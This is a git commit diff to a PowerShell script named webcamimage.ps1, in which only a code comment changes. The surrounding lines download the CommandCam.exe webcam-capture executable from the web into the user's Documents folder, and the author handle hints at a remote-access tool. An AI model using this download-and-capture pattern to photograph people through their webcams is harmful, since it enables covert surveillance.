7ed76c51eee839fe81c60fb9891771f2e4d7dfea
rat <112645929+iLoveRat@users.noreply.github.com>
2023-06-09 23:42:06 +0200

    yayyy

--- webcamimage.ps1
+++ webcamimage.ps1
@@ -1,5 +1,5 @@
 function webcam {
-    # gute nacht
+    # loading mod
     $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
     $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
